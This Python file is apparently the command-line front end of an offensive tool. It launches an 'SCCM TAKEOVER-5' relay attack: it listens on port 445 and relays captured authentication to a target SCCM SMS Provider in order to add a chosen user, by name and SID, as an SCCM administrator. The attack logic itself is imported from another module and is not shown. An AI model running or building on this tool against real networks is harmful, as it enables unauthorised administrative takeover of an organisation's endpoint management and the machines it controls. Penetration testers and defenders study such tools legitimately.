import typer
import asyncio
from lib.attacks.relay import HTTPSCCMRELAY
from lib.logger import init_logger

app = typer.Typer()
COMMAND_NAME = 'relay'
HELP = 'SCCM TAKEOVER-5 Attack'

@app.callback(no_args_is_help=True, invoke_without_command=True)

def main(
    target          : str   = typer.Option(None, "-t",  help="Target SCCM SMS Provider IP or hostname. "),
    target_user     : str   = typer.Option(None, "-tu",  help="Target username to add as SCCM admin. Ex: domain\\username"),
    target_sid      : str   = typer.Option(None, "-ts",  help="Target user's SID to add as SCCM admin. Ex: S-1-5-21-123456789...."),
    interface       : str   = typer.Option("0.0.0.0", "-i",  help="Interface to listen on."),
    port            : int   = typer.Option(445, "-p",  help="Port to listen on."),
    timeout         : int   = typer.Option(5, "-to", help="Timeout value."),
    verbose         : bool  = typer.Option(False, "-v", help="Enable verbose logging.")
):


    init_logger(verbose)
    http_relay = HTTPSCCMRELAY(target=target, target_user=target_user, target_sid=target_sid, interface=interface, port=port, timeout=timeout, verbose=verbose)
    http_relay.start()